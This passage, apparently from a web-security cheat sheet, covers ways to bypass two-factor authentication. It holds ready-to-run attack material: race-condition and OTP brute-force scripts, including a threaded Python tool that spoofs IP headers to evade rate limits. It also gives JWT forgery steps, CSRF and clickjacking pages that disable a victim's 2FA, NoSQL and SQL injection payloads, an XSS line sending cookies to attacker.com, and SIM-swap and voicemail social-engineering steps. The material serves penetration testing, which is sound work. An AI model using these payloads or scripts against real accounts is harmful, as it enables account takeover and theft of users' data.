STEP 2: SSO flow doesn't trigger 2FA
STEP 3: Authenticated without OTP
```

---

## Race Condition

Exploit timing vulnerabilities to use an OTP simultaneously or bypass attempt counters.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Turbo Intruder"}
  ```python [race_2fa.py]
  # Burp Suite Turbo Intruder - Race Condition
  # Send multiple OTP attempts simultaneously

  def queueRequests(target, wordlists):
      engine = RequestEngine(
          endpoint=target.endpoint,
          concurrentConnections=1,
          requestsPerConnection=100,
          pipeline=False
      )
      
      # Queue 100 different OTP codes to send simultaneously
      for i in range(100):
          code = str(i).zfill(6)
          engine.queue(
              target.req,
              code,
              gate='race1'  # Hold all requests
          )
      
      # Release all requests at once (race condition)
      engine.openGate('race1')

  def handleResponse(req, interesting):
      table.add(req)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Same OTP Multiple Sessions"}
  ```txt [Attack Flow]
  # Race Condition: Use same OTP across multiple sessions

  STEP 1: Login as victim in Browser A → Get session A
  STEP 2: Login as victim in Browser B → Get session B
  STEP 3: Login as victim in Browser C → Get session C
  STEP 4: Receive single OTP (sent to victim's phone)
  STEP 5: Simultaneously submit OTP on ALL three sessions
  STEP 6: If OTP is single-use, only one should succeed
          But with race condition, multiple might succeed
          → Each session gets authenticated

  # Impact: Multiple authenticated sessions from single OTP
  # Useful when attacker has limited OTP access
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Counter Bypass"}
  ```txt [Attack Flow]
  # Race Condition: Bypass attempt counter
  
  # Server logic: "After 3 failed attempts, lock OTP"
  # Race: Send 1000 requests simultaneously
  # → Counter increments non-atomically
  # → Many requests pass before counter reaches 3

  # Using curl:
  for i in $(seq 000000 000999); do
    OTP=$(printf "%06d" $i)
    curl -s -o /dev/null -w "%{http_code}" \
      -X POST "https://target.com/verify-2fa" \
      -H "Cookie: session=SESSION" \
      -d "otp=$OTP" &
  done
  wait

  # All requests fire nearly simultaneously
  # Rate limiter may only catch a few
  ```
  :::
::

---

## Session/Token Manipulation

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Session Fixation"}
  ```txt [Attack Flow]
  # If session token doesn't change after 2FA:

  STEP 1: Login with valid credentials → session=ABC123
  STEP 2: Server shows 2FA page (session=ABC123 still)
  STEP 3: In another browser, use session=ABC123
  STEP 4: Navigate directly to /dashboard
  STEP 5: If session is already "partially authenticated"
          and 2FA check is client-side → BYPASS

  # Or:
  STEP 1: Get pre-2FA session token
  STEP 2: Complete 2FA on attacker account
  STEP 3: Get post-2FA session token
  STEP 4: Compare the two tokens
  STEP 5: If only a flag changes (e.g., base64 decode shows "2fa=0" vs "2fa=1")
  STEP 6: Manually modify pre-2FA token to include "2fa=1"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="JWT 2FA Claim"}
  ```txt [Payloads]
  # If authentication uses JWT tokens:

  # Decode JWT (base64):
  eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidmljdGltIiwiMmZhX3ZlcmlmaWVkIjpmYWxzZX0.SIGNATURE

  # Decoded payload:
  {"user":"victim","2fa_verified":false}

  # Modified payload:
  {"user":"victim","2fa_verified":true}

  # If JWT uses weak/known signing key:
  # Re-sign with modified payload

  # If JWT uses "none" algorithm:
  {"alg":"none","typ":"JWT"}
  {"user":"victim","2fa_verified":true}
  # Base64 encode both, join with dots, empty signature

  # Common JWT 2FA claims to modify:
  "2fa_verified": false → true
  "mfa_complete": false → true  
  "auth_level": 1 → 2
  "step": "2fa" → "complete"
  "requires_2fa": true → false
  "otp_verified": 0 → 1
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Cross-Account Session"}
  ```txt [Attack Flow]
  # Use 2FA-verified session from one account on another

  STEP 1: Login to ATTACKER account
  STEP 2: Complete 2FA → Get authenticated session token
  STEP 3: Login to VICTIM account (in another browser)
  STEP 4: At 2FA step, replace VICTIM's session cookie
          with ATTACKER's authenticated session cookie
  STEP 5: Navigate to /dashboard
  STEP 6: Check which account is authenticated

  # Variation:
  STEP 1: Complete 2FA on attacker account → session=AUTHED_TOKEN
  STEP 2: Start login on victim account (get partially authenticated session)
  STEP 3: Swap the session token
  STEP 4: If server binds session to user ID poorly → bypass
  ```
  :::
::

---

## 2FA Enrollment / Setup Bypass

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Disable 2FA Without Verification"}
  ```txt [Payloads]
  # Try disabling 2FA without current OTP

  # API endpoint to disable 2FA:
  POST /api/user/2fa/disable
  {"password":"current_password"}
  # → Does it require OTP? If not → bypass

  DELETE /api/user/2fa
  # → No OTP required?

  PUT /api/user/settings
  {"2fa_enabled":false}
  # → Settings update without OTP?

  PATCH /api/user/profile
  {"mfa_enabled":false,"mfa_type":"none"}
  
  # Remove 2FA via account settings:
  POST /account/security/disable-2fa
  {"confirm":"yes"}
  # → No OTP prompt = bypass

  # Change phone number (for SMS 2FA):
  PUT /api/user/phone
  {"phone":"+1ATTACKER_NUMBER"}
  # → If no OTP required to change → OTP goes to attacker
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Re-enroll 2FA"}
  ```txt [Attack Flow]
  # Force re-enrollment of 2FA to get new secret

  STEP 1: Access 2FA setup endpoint:
          GET /api/user/2fa/setup
          POST /api/user/2fa/enroll

  STEP 2: Server returns new TOTP secret/QR code
          → Does it invalidate old secret?
          → Does it require current OTP to re-enroll?

  STEP 3: If no verification required:
          → Attacker re-enrolls 2FA with their own authenticator
          → Victim's 2FA is now controlled by attacker

  # Check these endpoints:
  GET  /api/2fa/setup
  POST /api/2fa/enable
  POST /api/2fa/enroll
  PUT  /api/2fa/reset
  POST /api/2fa/regenerate
  GET  /api/2fa/qr-code
  GET  /api/2fa/secret
  POST /api/2fa/backup-codes/regenerate
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="CSRF on 2FA Disable"}
  ```html [csrf_disable_2fa.html]
  <!-- CSRF to disable victim's 2FA -->
  <!-- Host this on attacker's website -->
  
  <!DOCTYPE html>
  <html>
  <body>
    <!-- Auto-submit form to disable 2FA -->
    <form id="csrf" action="https://target.com/api/user/2fa/disable" method="POST">
      <input type="hidden" name="confirm" value="true">
      <input type="hidden" name="disable" value="1">
    </form>
    
    <script>
      document.getElementById('csrf').submit();
    </script>
    
    <!-- OR via fetch if CORS allows -->
    <script>
      fetch('https://target.com/api/user/2fa/disable', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({confirm: true})
      });
    </script>
  </body>
  </html>
  ```
  :::
::

---

## Clickjacking on 2FA

```html [clickjack_2fa.html]
<!-- Clickjacking to trick user into disabling their own 2FA -->

<!DOCTYPE html>
<html>
<head>
<style>
  .target-iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0.0001;  /* Nearly invisible */
    z-index: 2;
  }
  .decoy {
    position: absolute;
    z-index: 1;
  }
  .decoy button {
    position: absolute;
    top: 350px;   /* Align with "Disable 2FA" button */
    left: 200px;
    padding: 15px 30px;
    font-size: 18px;
    cursor: pointer;
  }
</style>
</head>
<body>
  <div class="decoy">
    <h1>Congratulations! You won a prize!</h1>
    <button>Click Here to Claim</button>
  </div>
  
  <!-- Iframe loads victim's 2FA settings page -->
  <iframe class="target-iframe" src="https://target.com/account/security/2fa"></iframe>
</body>
</html>

<!-- 
  User clicks "Claim Prize" button
  Actually clicks "Disable 2FA" button on iframed page
  
  Prevention: X-Frame-Options or CSP frame-ancestors
  Test: Check if 2FA management pages allow iframing
-->
```

---

## Email/Phone Change → 2FA Bypass

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Email Change"}
  ```txt [Attack Flow]
  # Change email without OTP → password reset → bypass 2FA

  STEP 1: Login to victim account (with stolen password)
  STEP 2: At 2FA prompt, navigate to: /account/settings
  STEP 3: Change email address to attacker@evil.com
          PUT /api/user/email
          {"new_email":"attacker@evil.com"}
  STEP 4: Does this require OTP? If NOT:
  STEP 5: Email changed to attacker's address
  STEP 6: Use "Forgot Password" → reset link to attacker@evil.com
  STEP 7: Reset password → login → 2FA might be disabled post-reset

  # Also try:
  - Change email via API without completing 2FA
  - Change email via mobile API (different endpoint, less protection)
  - Change email via GraphQL mutation
  - Change email via older API version (v1 vs v2)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Phone Number Change"}
  ```txt [Attack Flow]
  # Change SMS 2FA phone number to attacker's number

  STEP 1: Access account settings (may not require 2FA completion)
  STEP 2: Change phone number:
          PUT /api/user/phone
          {"phone":"+1ATTACKER_PHONE"}
  STEP 3: If no OTP verification required for phone change:
          OTPs now sent to attacker's phone
  STEP 4: Complete 2FA with code sent to YOUR phone
  STEP 5: Full access to victim's account

  # Check if phone change requires:
  - Current OTP (from old phone)
  - Password re-entry
  - Email confirmation
  - If NONE → critical bypass
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="API Version Downgrade"}
  ```txt [Payloads]
  # Try older API versions that may lack 2FA enforcement

  # v2 (current - has 2FA):
  POST /api/v2/login
  POST /api/v2/verify-2fa

  # Try v1 (older - might skip 2FA):
  POST /api/v1/login
  → Does v1 even have 2FA?
  → Can you get authenticated session from v1?

  # Try different API paths:
  POST /api/login          (no version)
  POST /api/v0/login
  POST /api/v1/login
  POST /api/v3/login       (beta/unreleased)
  POST /mobile/api/login   (mobile API)
  POST /internal/api/login (internal API)
  POST /graphql            (GraphQL might skip 2FA)
  POST /rest/login
  POST /legacy/login

  # GraphQL bypass:
  POST /graphql
  {"query":"mutation { login(email:\"victim@example.com\", password:\"pass\") { token } }"}
  → Does GraphQL login return token without 2FA?
  ```
  :::
::

---

## SMS/Call Based Bypass

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="SIM Swap Attack"}
  ```txt [Attack Flow]
  # SIM Swap: Social engineer the carrier to transfer victim's
  # phone number to attacker's SIM card

  STEP 1: Gather victim info (name, DOB, SSN, account PIN)
  STEP 2: Call victim's mobile carrier
  STEP 3: Impersonate victim: "I lost my phone, need new SIM"
  STEP 4: Carrier transfers number to attacker's SIM
  STEP 5: Attacker now receives ALL SMS messages
  STEP 6: Login to victim's account → OTP sent to attacker
  STEP 7: Complete 2FA → Full account takeover

  # Note: This is a REAL attack vector used in high-profile cases
  # Twitter CEO Jack Dorsey was SIM-swapped in 2019
  # Severity: Critical
  # Mitigation: Use authenticator apps instead of SMS 2FA
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Voicemail Exploitation"}
  ```txt [Attack Flow]
  # If 2FA offers "Call me instead" option:

  STEP 1: Trigger "Call me" for OTP delivery
  STEP 2: Call victim's phone simultaneously (keep it busy)
  STEP 3: OTP call goes to VOICEMAIL
  STEP 4: Access victim's voicemail:
          - Default voicemail PINs (0000, 1234, last 4 of phone)
          - Caller ID spoofing to access voicemail
  STEP 5: Listen to voicemail → get OTP

  # For carrier voicemail access:
  # AT&T: Call from another phone, press * during greeting
  # T-Mobile: Call voicemail number, enter PIN
  # Verizon: Call *86, enter PIN
  # Most default PINs: 0000, 1234, last 4 digits of number
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="OTP to Different Number"}
  ```txt [Payloads]
  # Modify the phone number in the OTP request

  # Original request:
  POST /api/send-otp
  {"phone":"+1VICTIM_NUMBER","user_id":123}

  # Modified:
  POST /api/send-otp
  {"phone":"+1ATTACKER_NUMBER","user_id":123}

  # Parameter pollution:
  POST /api/send-otp
  {"phone":"+1VICTIM_NUMBER","phone":"+1ATTACKER_NUMBER"}

  # URL + body:
  POST /api/send-otp?phone=+1ATTACKER_NUMBER
  {"phone":"+1VICTIM_NUMBER"}

  # Array injection:
  {"phone":["+1VICTIM_NUMBER","+1ATTACKER_NUMBER"]}

  # With country code manipulation:
  {"phone":"ATTACKER_NUMBER","country_code":"+1"}
  ```
  :::
::

---

## Remember Device / Trusted Device Abuse

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Token Stealing"}
  ```txt [Attack Flow]
  # "Remember this device" sets a cookie/token to skip 2FA next time

  # Find the "remember device" cookie:
  # Common names:
  remember_device=TOKEN
  trusted_device=TOKEN
  device_token=TOKEN
  mfa_remember=TOKEN
  2fa_trusted=TOKEN
  device_id=TOKEN
  fingerprint=TOKEN

  # If token is predictable:
  # Check if it's based on: User-Agent + IP + timestamp
  # Check if it's sequential
  # Check if it's user-specific or global

  # Steal token via XSS:
  <script>
  fetch('https://attacker.com/steal?token=' + 
    document.cookie.match(/remember_device=([^;]+)/)[1]);
  </script>

  # Use stolen token to skip 2FA:
  Cookie: session=NEW_SESSION; remember_device=STOLEN_TOKEN
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Token Brute Force"}
  ```txt [Payloads]
  # If "remember device" token is short or predictable:

  # Check token format:
  remember_device=abc123          (short alphanumeric - bruteforceable)
  remember_device=1               (sequential integer - trivial)
  remember_device=YES             (boolean - just set it)
  remember_device=user@email.com  (based on email - predictable)

  # Try setting the cookie yourself:
  Cookie: remember_device=true
  Cookie: remember_device=1
  Cookie: remember_device=yes
  Cookie: trusted=true
  Cookie: mfa_bypass=1
  Cookie: skip_2fa=true
  Cookie: device_verified=true
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Token Reuse Across Accounts"}
  ```txt [Attack Flow]
  # Test if "remember device" token from attacker account
  # works on victim account

  STEP 1: Login to attacker account
  STEP 2: Complete 2FA, check "Remember this device"
  STEP 3: Capture remember_device cookie value
  STEP 4: Login to victim account
  STEP 5: At 2FA prompt, add attacker's remember_device cookie
  STEP 6: Refresh or navigate to /dashboard
  STEP 7: If token is not user-bound → 2FA skipped for victim

  # This works when the "trusted device" token is:
  # - Not bound to specific user
  # - Based only on device fingerprint
  # - Based only on IP address
  ```
  :::
::

---

## 2FA via Different Channels

```txt [Payloads]
# Try switching the 2FA delivery method

# If app sends OTP via SMS, try switching to:
POST /api/send-otp
{"method":"email","user_id":123}

POST /api/send-otp
{"method":"voice","user_id":123}

POST /api/send-otp
{"channel":"sms"}      → {"channel":"email"}
{"type":"sms"}         → {"type":"push"}
{"delivery":"phone"}   → {"delivery":"email"}

# Try requesting OTP to a different method that's easier to intercept:
{"otp_method":"authenticator"} → {"otp_method":"sms"}
{"otp_method":"sms"}           → {"otp_method":"email"}
{"otp_method":"push"}          → {"otp_method":"backup_code"}

# If email OTP, check if email goes to a different address:
{"method":"email","email":"attacker@evil.com"}
```

---

## NoSQL / SQL Injection in OTP

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="NoSQL Injection"}
  ```txt [Payloads]
  # MongoDB/NoSQL injection in OTP field

  # $ne (not equal) - matches any OTP that's not "wrong_value"
  {"otp":{"$ne":"wrong_value"}}
  {"otp":{"$ne":""}}
  {"otp":{"$ne":null}}
  {"otp":{"$ne":0}}

  # $gt (greater than) - matches any OTP greater than empty
  {"otp":{"$gt":""}}
  {"otp":{"$gt":0}}
  {"otp":{"$gt":"0"}}

  # $exists - matches if OTP field exists
  {"otp":{"$exists":true}}

  # $regex - matches any OTP
  {"otp":{"$regex":".*"}}
  {"otp":{"$regex":"^"}}
  {"otp":{"$regex":"\\d{6}"}}

  # $in - check if OTP is in array
  {"otp":{"$in":["000000","111111","123456","654321"]}}

  # $where - JavaScript evaluation
  {"otp":{"$where":"return true"}}

  # Combination:
  {"email":"victim@example.com","otp":{"$ne":"invalid"}}
  {"email":"victim@example.com","otp":{"$gt":""}}
  {"email":{"$ne":""},"otp":{"$ne":""}}

  # URL encoded (for form data):
  otp[$ne]=wrong_value
  otp[$gt]=
  otp[$exists]=true
  otp[$regex]=.*
  email=victim@example.com&otp[$ne]=
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="SQL Injection"}
  ```txt [Payloads]
  # SQL injection in OTP verification query
  # Expected query: SELECT * FROM otps WHERE user_id=123 AND otp='USER_INPUT'

  # Always true conditions:
  ' OR '1'='1
  ' OR '1'='1'--
  ' OR '1'='1'/*
  ' OR 1=1--
  ' OR 1=1#
  ') OR ('1'='1
  ') OR ('1'='1'--
  ' OR 'a'='a
  ' OR ''='
  1' OR 1=1--
  1' OR '1'='1

  # UNION based (extract data):
  ' UNION SELECT 1--
  ' UNION SELECT password FROM users WHERE email='admin@target.com'--

  # Time-based blind:
  ' OR SLEEP(5)--
  ' OR IF(1=1,SLEEP(5),0)--
  '; WAITFOR DELAY '0:0:5'--

  # Boolean-based blind:
  ' AND 1=1--     (true - check response)
  ' AND 1=2--     (false - check response difference)

  # In numeric OTP field (no quotes):
  123456 OR 1=1
  123456 OR 1=1--
  0 OR 1=1
  ```
  :::
::

---

## GraphQL 2FA Bypass

```txt [Payloads]
# GraphQL endpoints may have different 2FA enforcement

# Login mutation without 2FA:
POST /graphql
{
  "query": "mutation { login(email: \"victim@example.com\", password: \"password123\") { token user { id email role } } }"
}

# Check if token from GraphQL login is fully authenticated:
POST /graphql
{
  "query": "query { me { id email role settings { 2fa_enabled } } }",
  "variables": {}
}
# Headers: Authorization: Bearer TOKEN_FROM_LOGIN

# Verify OTP via GraphQL (might have different validation):
POST /graphql
{
  "query": "mutation { verifyOTP(code: \"000000\") { success token } }"
}

# Disable 2FA via GraphQL:
POST /graphql
{
  "query": "mutation { updateUserSettings(input: { mfa_enabled: false }) { success } }"
}

# Introspection query to find 2FA-related mutations:
POST /graphql
{
  "query": "{ __schema { mutationType { fields { name args { name type { name } } } } } }"
}
# Look for: verifyOTP, disableMFA, setupTOTP, etc.

# Batch query bypass:
POST /graphql
[
  {"query": "mutation { verifyOTP(code: \"000001\") { success } }"},
  {"query": "mutation { verifyOTP(code: \"000002\") { success } }"},
  {"query": "mutation { verifyOTP(code: \"000003\") { success } }"}
]
# → Send thousands of OTP attempts in single request
# → May bypass per-request rate limiting
```

---

## Mobile App / API Bypass

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Mobile API Endpoints"}
  ```txt [Payloads]
  # Mobile APIs often have WEAKER 2FA enforcement

  # Instead of web login:
  POST /api/v2/auth/login        (web - has 2FA)

  # Try mobile-specific endpoints:
  POST /api/mobile/login
  POST /api/mobile/v1/auth
  POST /api/app/login
  POST /mobile-api/auth/login
  POST /api/v1/mobile/authenticate
  POST /m-api/login

  # Mobile API might return token directly:
  POST /api/mobile/login
  {"email":"victim@example.com","password":"pass123"}

  Response: {"token":"eyJ...","user":{...}}
  → No 2FA step!

  # Check for mobile-specific headers:
  X-App-Version: 1.0.0
  X-Platform: android
  X-Device-ID: random-uuid
  User-Agent: AppName/1.0 (Android 14; Samsung Galaxy S24)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="API Key Authentication"}
  ```txt [Payloads]
  # API keys might bypass 2FA entirely

  # Check if API key gives authenticated access:
  GET /api/user/profile
  Authorization: Bearer API_KEY

  GET /api/user/profile
  X-API-Key: LEAKED_API_KEY

  GET /api/user/profile?api_key=LEAKED_KEY

  # Generate API key (might not require 2FA):
  POST /api/user/api-keys/generate
  {"name":"my-key"}

  # Use API key from settings page (before 2FA):
  # Sometimes accessible at /account/api-keys without completing 2FA
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Old App Version"}
  ```txt [Attack Flow]
  # Older versions of mobile apps may not implement 2FA

  STEP 1: Download older APK/IPA version
          - APKMirror, APKPure for Android
          - Use iTunes/iMazing for iOS
  STEP 2: Install old version
  STEP 3: Login → old version might skip 2FA
  STEP 4: If API hasn't changed → get authenticated token
  STEP 5: Use token with current app/API

  # Also try sending old app version header:
  X-App-Version: 1.0.0    (instead of current 5.2.0)
  User-Agent: AppName/1.0  (old user agent)
  ```
  :::
::

---

## Privilege Escalation After 2FA Bypass

::note
Once 2FA is bypassed, the attacker has **full authenticated access** equivalent to the victim. The privilege escalation depends on the victim's role and the application's functionality.
::

::steps{level="3"}

### Account Takeover

```txt [Impact]
# Full account takeover achieved via 2FA bypass:
- Read private messages/emails
- Access financial data
- Download personal files
- Change account settings
- Change password (lock out legitimate user)
- Change email (persistent access)
- Disable 2FA (remove future protection)
- Access connected services (OAuth apps)
- Impersonate user
```

### Admin Panel Access

```txt [Impact]
# If bypassing 2FA on admin account:
- Access admin dashboard
- Manage all users (create/delete/modify)
- Read all data in the system
- Modify application settings
- Access server configuration
- Export database
- Deploy code changes
- Access internal tools
- Pivot to internal network
```

### Lateral Movement

```txt [Impact]
# From compromised account:
- Access SSO → pivot to other applications
- Read API keys/tokens → access other services
- Access internal documentation → find more targets
- Read employee directory → target more accounts
- Access CI/CD → deploy backdoors
- Access cloud console → compromise infrastructure
```

### Data Exfiltration

```txt [Impact]
# Extract sensitive data:
- PII (Personal Identifiable Information)
- Financial records
- Trade secrets
- Customer database
- API keys and secrets
- Internal communications
- Source code
```

::

---

## Testing Checklist

::collapsible

```txt [2FA/MFA/OTP Testing Checklist]
═══════════════════════════════════════════════════════
  2FA / MFA / OTP BYPASS TESTING CHECKLIST
═══════════════════════════════════════════════════════

[ ] RESPONSE MANIPULATION
    [ ] Change response body: false → true
    [ ] Change status code: 403/401 → 200
    [ ] Swap entire response with valid 2FA response
    [ ] Modify redirect location in response
    [ ] Change error message to success message

[ ] DIRECT NAVIGATION
    [ ] Navigate directly to /dashboard after login
    [ ] Skip 2FA page entirely
    [ ] Access API endpoints directly
    [ ] Check cookie-based 2FA flags
    [ ] Modify localStorage/sessionStorage flags
    [ ] Remove Referer header

[ ] OTP BRUTE FORCE
    [ ] 4-digit code: 0000-9999
    [ ] 6-digit code: 000000-999999
    [ ] No rate limiting?
    [ ] No account lockout?
    [ ] No CAPTCHA after failures?
    [ ] Rate limit bypass via headers (X-Forwarded-For)
    [ ] Rate limit bypass via session reset
    [ ] Rate limit bypass via IP rotation

[ ] OTP INFORMATION DISCLOSURE
    [ ] OTP in response body
    [ ] OTP in response headers
    [ ] OTP in HTML source code
    [ ] OTP in JavaScript variables
    [ ] OTP in API response when sending/resending
    [ ] OTP in debug parameters

[ ] OTP REUSE / EXPIRY
    [ ] Reuse same OTP after logout/login
    [ ] Use OTP after requesting new one (old valid?)
    [ ] OTP valid after 5/30/60 minutes?
    [ ] OTP valid after 24 hours?
    [ ] TOTP time window too large?

[ ] NULL / EMPTY OTP
    [ ] Empty string
    [ ] Null value
    [ ] 0 / false / [] / {}
    [ ] Missing OTP parameter entirely
    [ ] Special strings: "null", "undefined", "NaN"

[ ] PARAMETER MANIPULATION
    [ ] Remove OTP parameter
    [ ] Swap user_id to victim
    [ ] Add disable_2fa=true parameter
    [ ] Use backup codes in OTP field
    [ ] Array injection: {"otp":["123456"]}

[ ] INJECTION ATTACKS
    [ ] NoSQL injection: {"$ne":""}
    [ ] SQL injection: ' OR '1'='1
    [ ] NoSQL $gt, $regex, $exists operators

[ ] SESSION MANIPULATION
    [ ] Session token changes after 2FA?
    [ ] JWT 2FA claims modifiable?
    [ ] Cross-account session swap
    [ ] Session fixation

[ ] PASSWORD RESET BYPASS
    [ ] Reset password → 2FA skipped on login?
    [ ] Password reset disables 2FA?
    [ ] OAuth/Social login skips 2FA?
    [ ] SSO/SAML skips 2FA?

[ ] ENROLLMENT BYPASS
    [ ] Disable 2FA without OTP verification?
    [ ] Re-enroll 2FA without current OTP?
    [ ] CSRF on 2FA disable?
    [ ] Change email without 2FA → password reset?
    [ ] Change phone without 2FA → receive OTP?

[ ] TRUSTED DEVICE ABUSE
    [ ] "Remember device" token predictable?
    [ ] Token works across accounts?
    [ ] Token bruteforceable?
    [ ] Cookie: remember_device=true (simple flag)?

[ ] RACE CONDITIONS
    [ ] Simultaneous OTP submissions
    [ ] Counter bypass via concurrent requests
    [ ] Same OTP across multiple sessions

[ ] ALTERNATIVE CHANNELS
    [ ] Mobile API skips 2FA?
    [ ] GraphQL endpoint skips 2FA?
    [ ] Old API version (v1) skips 2FA?
    [ ] Internal API skips 2FA?
    [ ] API key authentication skips 2FA?

[ ] SMS-SPECIFIC
    [ ] OTP sent to attacker-specified number?
    [ ] SIM swap feasibility
    [ ] Voicemail interception
    [ ] SS7 interception

[ ] CLICKJACKING
    [ ] 2FA settings page frameable?
    [ ] Missing X-Frame-Options?
    [ ] Missing CSP frame-ancestors?

[ ] TOTP-SPECIFIC
    [ ] TOTP secret leaked in setup response?
    [ ] Shared TOTP secret across users?
    [ ] TOTP secret in QR code URL accessible?

═══════════════════════════════════════════════════════
```

::

---

## Automation Scripts

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="2FA Recon Script"}
  ::code-collapse
  ```bash [2fa_recon.sh]
  #!/bin/bash
  #============================================================
  # 2FA/MFA/OTP Bypass Reconnaissance Script
  # Usage: ./2fa_recon.sh https://target.com
  #============================================================

  TARGET=$1
  OUTPUT="2fa_recon_$(echo $TARGET | sed 's|https\?://||' | tr '/' '_')"

  if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
  fi

  mkdir -p "$OUTPUT"

  echo "============================================"
  echo "  2FA/MFA Bypass Reconnaissance"
  echo "  Target: $TARGET"
  echo "============================================"

  # Check for 2FA-related endpoints
  echo "[*] Discovering 2FA endpoints..."
  ENDPOINTS=(
    "/verify-2fa"
    "/verify-otp"
    "/2fa"
    "/mfa"
    "/otp"
    "/two-factor"
    "/multi-factor"
    "/api/2fa/verify"
    "/api/otp/verify"
    "/api/mfa/verify"
    "/api/v1/auth/2fa"
    "/api/v2/auth/2fa"
    "/api/user/2fa/setup"
    "/api/user/2fa/disable"
    "/api/user/2fa/enable"
    "/api/user/2fa/secret"
    "/api/user/2fa/backup-codes"
    "/api/mobile/login"
    "/api/mobile/auth"
    "/graphql"
    "/account/security"
    "/account/2fa"
    "/settings/security"
  )

  for endpoint in "${ENDPOINTS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$endpoint" 2>/dev/null)
    if [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ]; then
      echo "[+] $endpoint → HTTP $STATUS"
      echo "$endpoint,$STATUS" >> "$OUTPUT/endpoints.csv"
    fi
  done

  # Check security headers
  echo ""
  echo "[*] Checking security headers..."
  curl -s -I "$TARGET" 2>/dev/null | grep -iE "(x-frame|content-security|x-xss|strict-transport)" \
    | tee "$OUTPUT/security_headers.txt"

  # Check for clickjacking (X-Frame-Options)
  XFO=$(curl -s -I "$TARGET" 2>/dev/null | grep -i "x-frame-options")
  if [ -z "$XFO" ]; then
    echo "[!] MISSING X-Frame-Options → Clickjacking possible on 2FA pages"
  fi

  echo ""
  echo "[+] Results saved to $OUTPUT/"
  echo "============================================"
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-terminal" label="OTP Brute Force"}
  ::code-collapse
  ```python [brute_2fa.py]
  #!/usr/bin/env python3
  """
  Advanced 2FA OTP Brute Force Script
  Supports: Rate limit bypass, IP rotation, session reset
  Usage: python3 brute_2fa.py --url TARGET --cookie SESSION
  """
  import requests
  import argparse
  import random
  import string
  import sys
  import time
  from concurrent.futures import ThreadPoolExecutor, as_completed

  def random_ip():
      return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

  def try_otp(url, session_cookie, otp_code, bypass_headers=True):
      headers = {
          "Content-Type": "application/json",
          "Cookie": f"session={session_cookie}"
      }
      
      if bypass_headers:
          ip = random_ip()
          headers.update({
              "X-Forwarded-For": ip,
              "X-Real-IP": ip,
              "X-Originating-IP": ip,
              "X-Client-IP": ip,
          })
      
      data = {"otp": otp_code}
      
      try:
          resp = requests.post(url, json=data, headers=headers, timeout=10, allow_redirects=False)
          
          # Define success conditions (customize per target)
          is_success = False
          
          if resp.status_code == 200 and "success" in resp.text.lower():
              is_success = True
          if resp.status_code == 302 and "/dashboard" in resp.headers.get("Location", ""):
              is_success = True
          if "invalid" not in resp.text.lower() and resp.status_code == 200:
              if len(resp.text) > 50:  # Response length different
                  is_success = True
          
          return otp_code, is_success, resp.status_code, len(resp.text)
      except Exception as e:
          return otp_code, False, 0, str(e)

  def main():
      parser = argparse.ArgumentParser(description="2FA OTP Brute Force")
      parser.add_argument("--url", required=True, help="2FA verification URL")
      parser.add_argument("--cookie", required=True, help="Session cookie value")
      parser.add_argument("--digits", type=int, default=6, help="OTP digits (4 or 6)")
      parser.add_argument("--threads", type=int, default=50, help="Concurrent threads")
      parser.add_argument("--start", type=int, default=0, help="Start code")
      parser.add_argument("--end", type=int, default=None, help="End code")
      parser.add_argument("--bypass", action="store_true", help="Use rate limit bypass headers")
      parser.add_argument("--delay", type=float, default=0, help="Delay between requests (seconds)")
      args = parser.parse_args()
      
      max_code = (10 ** args.digits) - 1
      end = args.end if args.end else max_code
      
      print(f"[*] Target: {args.url}")
      print(f"[*] Range: {str(args.start).zfill(args.digits)} - {str(end).zfill(args.digits)}")
      print(f"[*] Threads: {args.threads}")
      print(f"[*] Rate limit bypass: {args.bypass}")
      print(f"[*] Starting brute force...")
      
      codes = [str(i).zfill(args.digits) for i in range(args.start, end + 1)]
      found = False
      
      with ThreadPoolExecutor(max_workers=args.threads) as executor:
          futures = {}
          for code in codes:
              future = executor.submit(try_otp, args.url, args.cookie, code, args.bypass)
              futures[future] = code
              if args.delay > 0:
                  time.sleep(args.delay)
          
          for i, future in enumerate(as_completed(futures)):
              code, success, status, length = future.result()
              
              if success:
                  print(f"\n{'='*50}")
                  print(f"[+] VALID OTP FOUND: {code}")
                  print(f"[+] Status: {status}, Length: {length}")
                  print(f"{'='*50}")
                  found = True
                  executor.shutdown(wait=False, cancel_futures=True)
                  break
              
              if i % 500 == 0:
                  print(f"[*] Progress: {i}/{len(codes)} | Last: {code} | Status: {status} | Len: {length}")
      
      if not found:
          print("[-] No valid OTP found in range")

  if __name__ == "__main__":
      main()
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Nuclei Templates"}
  ::code-collapse
